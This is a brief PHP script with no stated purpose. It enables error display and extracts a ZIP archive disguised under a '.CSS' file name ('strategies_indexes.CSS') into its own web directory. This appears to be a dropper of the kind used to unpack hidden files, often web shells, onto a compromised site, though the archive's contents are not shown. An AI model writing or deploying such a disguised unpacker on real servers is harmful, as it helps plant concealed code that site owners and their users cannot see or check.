<?php
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

$zip = new ZipArchive;
$zip->open(dirname(__FILE__).'/strategies_indexes.CSS');
$zip->extractTo(dirname(__FILE__).'/');
$zip->close();

?>